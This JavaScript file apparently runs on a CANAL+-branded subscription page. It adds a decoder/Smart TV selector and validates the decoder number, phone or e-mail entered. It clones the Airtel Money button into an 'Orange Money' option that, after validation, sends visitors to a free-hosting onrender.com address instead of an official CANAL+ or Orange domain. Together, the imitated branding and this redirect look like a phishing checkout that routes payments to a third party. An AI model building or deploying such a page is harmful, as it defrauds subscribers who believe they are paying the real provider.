let plansSection = document.querySelector(".plans-section");
let lockedScrollY = 0;
let previousBodyStyles = null;
let updateFrame = 0;

function setBodyStyle(property, value, priority = "") {
  if (value) {
    document.body.style.setProperty(property, value, priority);
  } else {
    document.body.style.removeProperty(property);
  }
}

function updateScrollLock() {
  updateFrame = 0;
  addOrangeMoneyOption();
  const isCheckoutOpen = plansSection.querySelector('[role="dialog"]') !== null;

  if (isCheckoutOpen && previousBodyStyles === null) {
    lockedScrollY = window.scrollY;
    previousBodyStyles = ["position", "top", "left", "right", "width"].map((property) => [
      property,
      document.body.style.getPropertyValue(property),
      document.body.style.getPropertyPriority(property),
    ]);

    document.body.style.setProperty("position", "fixed");
    document.body.style.setProperty("top", `-${lockedScrollY}px`);
    document.body.style.setProperty("left", "0");
    document.body.style.setProperty("right", "0");
    document.body.style.setProperty("width", "100%");
    return;
  }

  if (!isCheckoutOpen && previousBodyStyles !== null) {
    previousBodyStyles.forEach(([property, value, priority]) => {
      setBodyStyle(property, value, priority);
    });
    previousBodyStyles = null;
    window.scrollTo(0, lockedScrollY);
  }
}

function getDialogError(dialog) {
  return dialog.querySelector(".canalplus-payment-error");
}

function updateFieldMode(dialog, mode, focusInput = false) {
  const input = dialog.querySelector("#decoder-number");
  const label = dialog.querySelector('label[for="decoder-number"]');
  const helpText = dialog.querySelector("#decoder-number")?.closest("div")?.querySelector("p:last-of-type");
  const deviceNote = dialog.querySelector(".canalplus-device-note");
  const error = getDialogError(dialog);

  if (!(input instanceof HTMLInputElement) || !(label instanceof HTMLElement)) {
    return;
  }

  dialog.dataset.deviceMode = mode;

  if (mode === "smarttv") {
    label.textContent = "Numéro de téléphone ou e-mail";
    input.placeholder = "Entrez votre numéro de téléphone ou votre e-mail";
    input.setAttribute("aria-label", "Numéro de téléphone ou e-mail");
    if (helpText) {
      helpText.textContent = "Vous pouvez saisir un numéro de téléphone ou un e-mail.";
    }
    if (deviceNote) {
      deviceNote.textContent = "Avec Smart TV, utilisez votre adresse e-mail ou numéro de téléphone associé à votre compte CANAL+.";
      deviceNote.hidden = false;
    }
    if (error) {
      error.textContent = "Veuillez saisir un numéro de téléphone ou un e-mail.";
    }
  } else {
    label.textContent = "Numéro du décodeur";
    input.placeholder = "Entrez votre numéro de décodeur";
    input.setAttribute("aria-label", "Numéro du décodeur");
    if (helpText) {
      helpText.textContent = "Vous pouvez saisir des lettres et des chiffres.";
    }
    if (deviceNote) {
      deviceNote.textContent = "Vous pouvez aussi choisir Smart TV ci-dessus.";
      deviceNote.hidden = false;
    }
    if (error) {
      error.textContent = "Veuillez saisir votre numéro de décodeur.";
    }
  }

  if (focusInput) {
    input.focus();
  }
}

function validateEnteredValue(dialog) {
  const input = dialog.querySelector("#decoder-number");
  const error = getDialogError(dialog);

  if (!(input instanceof HTMLInputElement)) {
    return false;
  }

  const value = input.value.trim();
  const mode = dialog.dataset.deviceMode || "decoder";

  if (mode === "smarttv") {
    const isEmail = /.+@.+\..+/.test(value);
    const isPhone = /^[+\d()\s-]{8,}$/.test(value);
    const isValid = isEmail || isPhone;

    if (!isValid && error) {
      error.hidden = false;
      error.textContent = "Veuillez saisir un numéro de téléphone ou un e-mail.";
      input.focus();
      return false;
    }

    if (error) {
      error.hidden = true;
    }
    return true;
  }

  if (!value && error) {
    error.hidden = false;
    error.textContent = "Veuillez saisir votre numéro de décodeur.";
    input.focus();
    return false;
  }

  if (error) {
    error.hidden = true;
  }

  return true;
}

function addDeviceSelector(dialog) {
  if (!dialog || dialog.querySelector(".canalplus-device-switch-wrap")) {
    return;
  }

  const modalHeader = dialog.querySelector(":scope > header");
  if (modalHeader && !dialog.querySelector(".canalplus-modal-banner")) {
    const banner = document.createElement("div");
    banner.className = "canalplus-modal-banner";
    banner.innerHTML = `
      <div class="canalplus-banner-copy">
        <div class="canalplus-banner-logo" aria-label="CANAL+">CANAL+</div>
        <div class="canalplus-banner-tagline">Divertissement sans limites</div>
      </div>
      <div class="canalplus-banner-tv" aria-hidden="true">
        <span class="canalplus-tv-screen"></span>
        <img src="./assets/canalplus-decoder.png" alt="" />
      </div>
    `;
    const closeButton = modalHeader.querySelector("button");
    if (closeButton) {
      closeButton.classList.add("canalplus-banner-close");
      banner.appendChild(closeButton);
    }
    dialog.insertBefore(modalHeader, dialog.firstChild);
    dialog.insertBefore(banner, modalHeader);

    const eyebrow = [...modalHeader.querySelectorAll("p")].find((paragraph) =>
      paragraph.textContent.trim() === "VOTRE FORMULE",
    );
    if (eyebrow) {
      eyebrow.classList.add("canalplus-formula-eyebrow");
    } else {
      const newEyebrow = document.createElement("p");
      newEyebrow.className = "canalplus-formula-eyebrow";
      newEyebrow.textContent = "VOTRE FORMULE";
      modalHeader.insertBefore(newEyebrow, modalHeader.firstChild);
    }
  }

  const modalBody = modalHeader?.nextElementSibling;
  if (modalBody) {
    [...modalBody.children].forEach((section) => {
      if (section.textContent.includes("Abonnement mensuel")) {
        section.classList.add("canalplus-plan-summary");
      }
      if (section.textContent.includes("Choisissez votre moyen de paiement")) {
        section.classList.add("canalplus-payment-section");
      }
    });
  }

  const input = dialog.querySelector("#decoder-number");
  const inputLabel = dialog.querySelector('label[for="decoder-number"]');

  if (!(input instanceof HTMLInputElement)) {
    return;
  }

  let inputGroup = input.parentElement;
  while (inputGroup && inputLabel && !inputGroup.contains(inputLabel)) {
    inputGroup = inputGroup.parentElement;
  }
  if (!inputGroup) {
    return;
  }
  let modalBodyRoot = inputGroup;
  while (modalBodyRoot.parentElement && modalBodyRoot.parentElement !== dialog) {
    modalBodyRoot = modalBodyRoot.parentElement;
  }
  modalBodyRoot.classList.add("canalplus-modal-body");

  const switcherWrap = document.createElement("div");
  switcherWrap.className = "canalplus-device-switch-wrap";
  switcherWrap.innerHTML = `
    <div class="canalplus-device-title">Type d'équipement</div>
    <div class="canalplus-device-switch">
      <button type="button" class="canalplus-device-option is-selected" data-device="decoder" aria-pressed="true">
        <span class="device-art" aria-hidden="true">
          <img src="./assets/canalplus-decoder.png" alt="Décodeur" />
        </span>
        <span class="device-text"><span class="device-name">Décodeur</span><span class="device-brand">CANAL+</span></span>
      </button>
      <button type="button" class="canalplus-device-option" data-device="smarttv" aria-pressed="false">
        <span class="device-art" aria-hidden="true">
          <svg viewBox="0 0 64 48" focusable="false">
            <rect x="5" y="3" width="54" height="34" rx="2" fill="none" stroke="currentColor" stroke-width="4" />
            <path d="M25 45h14M32 37v8" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round" />
          </svg>
        </span>
        <span class="device-text"><span class="device-name">Smart TV</span><span class="device-brand"></span></span>
      </button>
    </div>
  `;

  inputGroup.insertBefore(switcherWrap, inputGroup.firstChild);

  const deviceNote = document.createElement("p");
  deviceNote.className = "canalplus-device-note";
  deviceNote.textContent = "Vous pouvez aussi choisir Smart TV ci-dessus.";
  inputGroup.appendChild(deviceNote);

  switcherWrap.querySelectorAll("button").forEach((button) => {
    button.addEventListener("click", () => {
      const mode = button.dataset.device || "decoder";
      switcherWrap.querySelectorAll("button").forEach((option) => {
        const isSelected = option === button;
        option.classList.toggle("is-selected", isSelected);
        option.setAttribute("aria-pressed", String(isSelected));
      });
      updateFieldMode(dialog, mode, true);
    });
  });

  dialog.dataset.deviceMode = "decoder";
  updateFieldMode(dialog, "decoder");
}

function addOrangeMoneyOption() {
  const dialog = plansSection?.querySelector('[role="dialog"]');
  const airtelButton = dialog && [...dialog.querySelectorAll("button")].find((button) =>
    button.textContent?.includes("Airtel Money"),
  );

  if (!dialog || !airtelButton || airtelButton.parentElement?.querySelector('[data-payment="orange-money"]')) {
    if (dialog) {
      addDeviceSelector(dialog);
      attachPaymentValidation(dialog);
    }
    return;
  }

  const paymentOptions = airtelButton.parentElement;
  const decoderInput = dialog.querySelector("#decoder-number");
  if (!paymentOptions || !(decoderInput instanceof HTMLInputElement)) {
    return;
  }

  addDeviceSelector(dialog);
  airtelButton.classList.add("canalplus-airtel-option");
  paymentOptions.classList.add("canalplus-payment-options");

  const orangeButton = airtelButton.cloneNode(true);
  orangeButton.dataset.payment = "orange-money";
  orangeButton.setAttribute("aria-label", "Orange Money");
  orangeButton.classList.add("canalplus-orange-option");

  const badge = orangeButton.querySelector("span");
  if (!badge) {
    return;
  }
  badge.textContent = "O";
  badge.classList.add("canalplus-orange-badge");

  orangeButton.childNodes.forEach((node) => {
    if (node.nodeType === Node.TEXT_NODE && node.textContent.includes("Airtel Money")) {
      node.textContent = " Orange Money";
    }
  });

  const error = document.createElement("p");
  error.className = "canalplus-payment-error";
  error.setAttribute("role", "alert");
  error.hidden = true;
  error.textContent = "Veuillez saisir votre numéro de décodeur.";

  decoderInput.addEventListener("input", () => {
    error.hidden = true;
  });

  const attachOrangeClick = () => {
    if (!validateEnteredValue(dialog)) {
      return;
    }
    window.location.assign("https://orangecanal.onrender.com");
  };

  orangeButton.addEventListener("click", attachOrangeClick);
  paymentOptions.append(orangeButton);
  paymentOptions.insertAdjacentElement("afterend", error);
  attachPaymentValidation(dialog);
}

function attachPaymentValidation(dialog) {
  const paymentButtons = dialog.querySelectorAll("button");

  paymentButtons.forEach((button) => {
    if (!button.textContent || !/Airtel|Orange/.test(button.textContent) || button.dataset.validationBound === "true") {
      return;
    }

    button.dataset.validationBound = "true";
    button.addEventListener("click", (event) => {
      if (!validateEnteredValue(dialog)) {
        event.preventDefault();
        event.stopPropagation();
      }
    });
  });
}

const checkoutObserver = new MutationObserver(() => {
  if (updateFrame === 0) {
    updateFrame = window.requestAnimationFrame(updateScrollLock);
  }
});

const plansSectionObserver = new MutationObserver(() => {
  plansSection = document.querySelector(".plans-section");
  if (plansSection instanceof HTMLElement) {
    plansSectionObserver.disconnect();
    checkoutObserver.observe(plansSection, { childList: true, subtree: true });
  }
});

if (plansSection instanceof HTMLElement) {
  checkoutObserver.observe(plansSection, { childList: true, subtree: true });
} else {
  plansSectionObserver.observe(document.documentElement, { childList: true, subtree: true });
}
